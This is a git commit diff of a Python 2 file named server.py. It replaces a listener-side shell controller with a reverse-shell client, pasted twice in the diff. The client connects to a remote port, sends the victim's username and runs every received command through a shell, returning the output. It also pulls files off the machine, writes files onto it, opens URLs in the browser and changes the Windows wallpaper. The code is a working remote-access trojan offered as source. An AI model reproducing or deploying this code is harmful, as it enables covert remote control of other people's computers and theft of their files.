73f082e047a45a7e29d3f9cefaf3dc3ab12b14c3
Baddou Salah Eddine <sed.baddou@gmail.com>
2017-01-20 15:45:25 +0000

    Update server.py

--- server.py
+++ server.py
@@ -1,107 +1,185 @@
+
+
 import socket 
-import os      
-import threading
+import subprocess 
+import os          
+import webbrowser
+import platform
+import ctypes
+import hashlib
 
-#CD , LS , DIR , needs fixing
-'''
-def cd(conn,command):
-	conn.send('pwd')
-	cdto=str(command.split(' ')[-1])
+def transfer(s,command,username):
+    x1,src,dst=map(str,command.split('*'))
+    if (x1=='download'):
+        if os.path.exists(src):
+            f = open(src, 'rb')
+            packet = f.read(1024)
+            while packet != '':
+                s.send(packet) 
+                packet = f.read(1024)
+            s.send('DONE')
+            f.close()
+        else: # the file doesn't exist
+            s.send('Unable to find out the file')
+  
+    elif (x1=='upload'):
+        file_to_write=open(dst,'wb')
+        bits=s.recv(1024)    
+        while True: 
+            if not bits.endswith('DONE'):
+                file_to_write.write(bits)
+            elif bits.endswith('DONE'):
+                bits=bits.replace('DONE','')
+                file_to_write.write(bits)
+                file_to_write.close()
+                break
+            bits=s.recv(1024)
+        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
+        md5_sv=s.recv(1024)
+        if md5_cl==md5_sv:
+            s.send('md5 OK')
+        else :
+            s.send('md5 NOK')
+#upload needs fixing                
 
-	pathinit=conn.recv(1024)
-	path=map(str,pathinit.split('/'))
-	del(path[0])
+def __browse(s,command):
+    new = 2 
+    url=command.split(' ')[-1]
+    url="http://"+url
+    webbrowser.open(url)
 
-	elif cdto[0]=='/':
-		return str(cdto)
-	elif cdto[0]=='.':
-		return str(pathinit)+str(cdto)
-	else :
-		s='..'
-		k=0
-		for s in cdto:
-			k+=1
-		for i in range(k):
-			del	
+def change_desktop_bg(s,command):
 
-
-def ls(conn,command):
-	pathtemp=str(cd(conn,command))
-	conn.send('ls '+pathtemp)
-	print conn.recv(1024)
-    '''
-
-
-
-def transfer(conn,command):
-	conn.send(command)
-	file = command.split('*')[-1]
-	f = open('/root/Desktop/pypy/'+file,'wb') 
-	bits = conn.recv(1024)
-	while bits!='': 
-		if 'Unable to find out the file' in bits:
-			print '[-] Unable to find out the file'
-			break
-		f.write(bits)
-		bits=conn.recv(1024)
-		if bits.endswith('DONE'):
-			bits=bits.replace('DONE','')
-			f.write(bits)
-			f.close()
-			break
-		
-	
-        
+    #need to make the path variable because i will normally upload an image from my system to the target
+    bg_path=str(command.split(' ')[-1])
     
-def sendd(conn,command):
-	conn.send(command)
-	file=command.split('*')[-1]
-	file_to_send=open('/root/Desktop/pypy/'+str(file),'rb')
-	packet=file_to_send.read(1024)
-	while packet!='':
-		conn.send(packet) 
-		packet = file_to_send.read(1024)
-	conn.send('DONE')
-	if conn.recv(1024)=='DONE':
-		file_to_send.close()
-		print 'Send Successful'
+    SPI_SETDESKWALLPAPER = 20 
+    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)
 
-
-def connect():
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(("127.0.0.1", 8082))
-        s.listen(100)
-        print '[+] Listening for incoming TCP connection on port 8080'
-        conn,addr=s.accept()
-        print '[+] We got a connection from: ', addr
-        while True:   
-                command=raw_input("Shell>")		
-                if 'terminate' in command:
-                        conn.send('terminate')
-                        conn.close() 
-                        break
-                elif 'download' in command: 
-                        transfer(conn,command)
-                elif 'upload' in command:
-                        sendd(conn,command)
-                elif 'browse' in command:
-                        conn.send(command)
-                        pass
-                elif 'change_dk_bg' in command:
-                        conn.send(command)
-                        pass
-                else :	
-                        conn.send(command) 
-                        print conn.recv(1024)
         
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('127.0.0.1', 8081))
+    os=str(platform.system())
+    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    username=str(CMD.stdout.read().split('\\')[-1])
+    s.send(username)
+    while True: 
+        command=s.recv(1024)
+        if 'terminate' in command:
+            s.close()
+            break 
+        elif 'download' in command:            
+            transfer(s,command,username)
+        elif 'upload' in command:
+            transfer(s,command,username)
+        elif 'browse' in command:
+            __browse(s,command)
+        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
+            change_desktop_bg(s,command)
+        else:
+            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send( CMD.stdout.read()  ) 
+            s.send( CMD.stderr.read()  ) 
+
 def main ():
-	connect()
+    connect()
 main()
 
 
 
 
 
+
+
+
+import socket 
+import subprocess 
+import os          
+import webbrowser
+import platform
+import ctypes
+import hashlib
+
+def transfer(s,command,username):
+    x1,src,dst=map(str,command.split('*'))
+    if (x1=='download'):
+        if os.path.exists(src):
+            f = open(src, 'rb')
+            packet = f.read(1024)
+            while packet != '':
+                s.send(packet) 
+                packet = f.read(1024)
+            s.send('DONE')
+            f.close()
+        else: # the file doesn't exist
+            s.send('Unable to find out the file')
+  
+    elif (x1=='upload'):
+        '''username=username.replace(username[-1],'')
+        username=username.replace('\r','')
+        file_to_write=open('C:\\Users\\'+username+'\\'+dst,'wb')'''
+        file_to_write=open(dst,'wb')
+        bits=s.recv(1024)    
+        while True: 
+            file_to_write.write(bits)
+            if bits.endswith('DONE'):
+                bits=bits.replace('DONE','')
+                file_to_write.write(bits)
+                file_to_write.close()
+                break
+            bits=s.recv(1024)
+        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
+        md5_sv=s.recv(1024)
+        if md5_cl==md5_sv:
+            s.send('md5 OK')
+        else :
+            s.send('md5 NOK')
+#upload needs fixing                
+
+def __browse(s,command):
+    new = 2 
+    url=command.split(' ')[-1]
+    url="http://"+url
+    webbrowser.open(url)
+
+def change_desktop_bg(s,command):
+
+    #need to make the path variable because i will normally upload an image from my system to the target
+    bg_path=str(command.split(' ')[-1])
+    
+    SPI_SETDESKWALLPAPER = 20 
+    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)
+
+        
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('127.0.0.1', 8081))
+    os=str(platform.system())
+    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    username=str(CMD.stdout.read().split('\\')[-1])
+    s.send(username)
+    while True: 
+        command=s.recv(1024)
+        if 'terminate' in command:
+            s.close()
+            break 
+        elif 'download' in command:            
+            transfer(s,command,username)
+        elif 'upload' in command:
+            transfer(s,command,username)
+        elif 'browse' in command:
+            __browse(s,command)
+        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
+            change_desktop_bg(s,command)
+        else:
+            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send( CMD.stdout.read()  ) 
+            s.send( CMD.stderr.read()  ) 
+
+def main ():
+    connect()
+main()
 
 
 
